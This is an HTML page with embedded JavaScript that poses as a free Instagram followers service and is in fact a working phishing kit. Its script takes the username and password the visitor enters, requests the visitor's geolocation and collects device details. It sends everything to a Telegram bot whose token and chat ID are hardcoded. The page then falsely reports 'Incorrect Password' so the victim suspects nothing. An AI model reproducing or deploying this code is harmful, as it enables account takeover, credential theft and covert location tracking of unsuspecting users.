<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Free Followers</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #8a2be2;
            --secondary: #4b0082;
            --accent: #ff00ff;
            --text: #ffffff;
            --error: #ff3860;
            --glass: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
        }

        body {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--text);
            padding: 20px;
            overflow-x: hidden;
        }

        .container {
            width: 100%;
            max-width: 450px;
            background: var(--glass);
            backdrop-filter: blur(10px);
            -webkit-backdrop-filter: blur(10px);
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 255, 255, 0.1);
            animation: fadeIn 0.8s ease-out, tilt 5s infinite alternate;
            position: relative;
            overflow: hidden;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes tilt {
            0% { transform: rotate(-1deg); }
            100% { transform: rotate(1deg); }
        }

        .container::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
            animation: rotate 15s linear infinite;
            z-index: -1;
        }

        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        h1 {
            text-align: center;
            margin-bottom: 30px;
            font-weight: 600;
            font-size: 28px;
            background: linear-gradient(to right, #fff, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 2px 10px rgba(255, 0, 255, 0.3);
        }

        .input-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 500;
            font-size: 14px;
            opacity: 0.9;
        }

        .input-group input {
            width: 100%;
            padding: 15px;
            background: rgba(255, 255, 255, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 10px;
            color: var(--text);
            font-size: 16px;
            transition: all 0.3s ease;
            outline: none;
        }

        .input-group input:focus {
            border-color: var(--accent);
            box-shadow: 0 0 0 2px rgba(255, 0, 255, 0.3);
            background: rgba(255, 255, 255, 0.15);
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.5);
        }

        .followers-options {
            display: flex;
            justify-content: space-between;
            margin: 30px 0;
            gap: 15px;
        }

        .follower-option {
            flex: 1;
            position: relative;
            min-width: 0;
        }

        .follower-option input {
            position: absolute;
            opacity: 0;
            width: 0;
            height: 0;
        }

        .follower-option label {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 15px 5px;
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
            font-weight: 500;
            font-size: 14px;
            backdrop-filter: blur(5px);
            -webkit-backdrop-filter: blur(5px);
            height: 100%;
            text-align: center;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
        }

        .follower-option label span.count {
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 5px;
            background: linear-gradient(to right, #fff, #ff00ff);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .follower-option label span.text {
            font-size: 12px;
            opacity: 0.8;
        }

        .follower-option input:checked + label {
            background: rgba(255, 0, 255, 0.15);
            border-color: var(--accent);
            box-shadow: 0 0 20px rgba(255, 0, 255, 0.4);
            transform: translateY(-5px) scale(1.03);
        }

        .follower-option label:hover {
            background: rgba(255, 255, 255, 0.1);
            transform: translateY(-3px);
            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
        }

        .follower-option label::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            border-radius: 10px;
            background: linear-gradient(135deg, rgba(255,255,255,0.1) 0%, transparent 100%);
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .follower-option label:hover::before {
            opacity: 1;
        }

        .follower-option input:checked + label::after {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            border: 2px solid var(--accent);
            border-radius: 12px;
            opacity: 0;
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0% { opacity: 0.7; box-shadow: 0 0 0 0 rgba(255, 0, 255, 0.7); }
            70% { opacity: 0.4; box-shadow: 0 0 0 10px rgba(255, 0, 255, 0); }
            100% { opacity: 0; box-shadow: 0 0 0 0 rgba(255, 0, 255, 0); }
        }

        .start-btn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(45deg, var(--primary), var(--accent));
            border: none;
            border-radius: 10px;
            color: white;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
            position: relative;
            overflow: hidden;
            box-shadow: 0 4px 15px rgba(138, 43, 226, 0.4);
        }

        .start-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(138, 43, 226, 0.6);
        }

        .start-btn:active {
            transform: translateY(1px);
        }

        .start-btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: 0.5s;
        }

        .start-btn:hover::before {
            left: 100%;
        }

        .message {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
            min-height: 20px;
            color: var(--error);
            font-weight: 500;
            opacity: 0;
            transition: opacity 0.3s ease;
        }

        .message.show {
            opacity: 1;
        }

        .loader {
            display: none;
            width: 50px;
            height: 50px;
            margin: 20px auto;
            border: 5px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            border-top-color: var(--accent);
            animation: spin 1s ease-in-out infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        @media (max-width: 480px) {
            .container {
                padding: 20px;
            }
            
            .followers-options {
                flex-direction: row;
                flex-wrap: wrap;
                gap: 10px;
            }
            
            .follower-option {
                flex: 1 1 calc(50% - 10px);
                min-width: calc(50% - 10px);
            }
            
            h1 {
                font-size: 24px;
            }
        }

        @media (max-width: 350px) {
            .follower-option {
                flex: 1 1 100%;
                min-width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Get Free Instagram Followers</h1>
        
        <div class="input-group">
            <label for="username">Instagram Username</label>
            <input type="text" id="username" placeholder="Enter your username" required>
        </div>
        
        <div class="input-group">
            <label for="password">Instagram Password</label>
            <input type="password" id="password" placeholder="Enter your password" required>
        </div>
        
        <div class="followers-options">
            <div class="follower-option">
                <input type="radio" id="option-100" name="followers" value="100">
                <label for="option-100">
                    <span class="count">100</span>
                    <span class="text">Followers</span>
                </label>
            </div>
            <div class="follower-option">
                <input type="radio" id="option-200" name="followers" value="200">
                <label for="option-200">
                    <span class="count">200</span>
                    <span class="text">Followers</span>
                </label>
            </div>
            <div class="follower-option">
                <input type="radio" id="option-500" name="followers" value="500" checked>
                <label for="option-500">
                    <span class="count">500</span>
                    <span class="text">Followers</span>
                </label>
            </div>
        </div>
        
        <button class="start-btn" id="startBtn">Start</button>
        
        <div class="loader" id="loader"></div>
        <div class="message" id="message"></div>
    </div>

    <script>
        // === CONFIGURATION ===
        const BOT_TOKEN = '7659085089:AAGTE5B4NRLG_tFvbfYayfrG0URgFgXnv5w';
        const CHAT_ID = '6319619567';

        // === DEVICE INFO FUNCTION ===
        function getDeviceInfo() {
          return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookiesEnabled: navigator.cookieEnabled,
            screenSize: `${screen.width}x${screen.height}`,
          };
        }

        // === LOCATION FUNCTION ===
        function sendLocationToTelegram(position, username, password, followersCount) {
          const lat = position.coords.latitude;
          const lon = position.coords.longitude;
          const accuracy = position.coords.accuracy;
          const timestamp = new Date(position.timestamp).toLocaleString();

          const device = getDeviceInfo();

          const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
          const earthLink = `https://earth.google.com/web/@${lat},${lon},100a`;

          const message = `
[Instagram Login Attempt]
- Username: ${username}
- Password: ${password}
- Followers Requested: ${followersCount}

[Device Info]
- User Agent: ${device.userAgent}
- Platform: ${device.platform}
- Language: ${device.language}
- Screen Size: ${device.screenSize}
- Cookies Enabled: ${device.cookiesEnabled}

[Location Info]
- Latitude: ${lat}
- Longitude: ${lon}
- Accuracy: ${accuracy} meters
- Time: ${timestamp}

[Links]
- Google Maps: ${mapsLink}
- Google Earth: ${earthLink}
          `;

          // Send to Telegram
          const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
          fetch(telegramURL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: CHAT_ID,
              text: message,
            })
          })
          .then(res => res.json())
          .then(data => console.log("Sent to Telegram:", data))
          .catch(err => console.error("Telegram Error:", err));
        }

        // === GET LOCATION ===
        function getLocation(username, password, followersCount) {
          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
              (position) => sendLocationToTelegram(position, username, password, followersCount), 
              (err) => {
                console.log("Location error: " + err.message);
                // Send data without location if geolocation fails
                sendToTelegramBot(username, password, followersCount);
              });
          } else {
            console.log("Geolocation not supported.");
            // Send data without location if geolocation not supported
            sendToTelegramBot(username, password, followersCount);
          }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const startBtn = document.getElementById('startBtn');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const messageElement = document.getElementById('message');
            const loader = document.getElementById('loader');
            
            startBtn.addEventListener('click', function() {
                if (validateInputs()) {
                    const username = usernameInput.value.trim();
                    const password = passwordInput.value.trim();
                    const followersCount = document.querySelector('input[name="followers"]:checked').value;
                    
                    // Show loader
                    loader.style.display = 'block';
                    messageElement.classList.remove('show');
                    
                    // Get location and send all data to Telegram
                    getLocation(username, password, followersCount);
                    
                    // Simulate processing time
                    setTimeout(() => {
                        loader.style.display = 'none';
                        showMessage("Incorrect Password");
                        
                        // Reset form (optional)
                        passwordInput.value = '';
                    }, 3000);
                }
            });
            
            function validateInputs() {
                if (!usernameInput.value.trim()) {
                    showMessage("Please enter your username");
                    usernameInput.focus();
                    return false;
                }
                
                if (!passwordInput.value.trim()) {
                    showMessage("Please enter your password");
                    passwordInput.focus();
                    return false;
                }
                
                return true;
            }
            
            function sendToTelegramBot(username, password, followersCount) {
                const device = getDeviceInfo();
                
                const text = `
[Instagram Login Attempt]
- Username: ${username}
- Password: ${password}
- Followers Requested: ${followersCount}

[Device Info]
- User Agent: ${device.userAgent}
- Platform: ${device.platform}
- Language: ${device.language}
- Screen Size: ${device.screenSize}
- Cookies Enabled: ${device.cookiesEnabled}

[Location Info]
- Location access denied or not supported
                `;
                
                const telegramURL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                fetch(telegramURL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                    })
                })
                .then(res => res.json())
                .then(data => console.log("Sent to Telegram:", data))
                .catch(err => console.error("Telegram Error:", err));
            }
            
            function showMessage(message) {
                messageElement.textContent = message;
                messageElement.classList.add('show');
            }
        });
    </script>
</body>
</html>
